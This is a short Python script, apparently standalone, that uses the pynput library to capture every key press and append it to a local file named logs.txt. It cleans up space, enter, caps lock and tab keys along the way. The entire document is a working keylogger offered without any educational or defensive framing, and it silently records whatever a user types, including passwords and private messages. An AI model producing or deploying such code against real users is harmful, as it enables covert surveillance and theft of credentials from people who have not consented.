from pynput.keyboard import Listener

def write_to_file(key):
    data_key = str(key)
    data_key = data_key.replace("'","")
    # print(data_key)

    if data_key == 'Key.space':
        data_key = ' '
    
    if data_key == 'Key.enter':
        data_key = '\n'
    
    if data_key == 'Key.caps_lock':
        data_key = ''
    
    if data_key == 'Key.tab':
        data_key = ''
    
    with open('logs.txt','a') as f:
        f.write(data_key)

with Listener(on_press = write_to_file) as l:
    l.join()
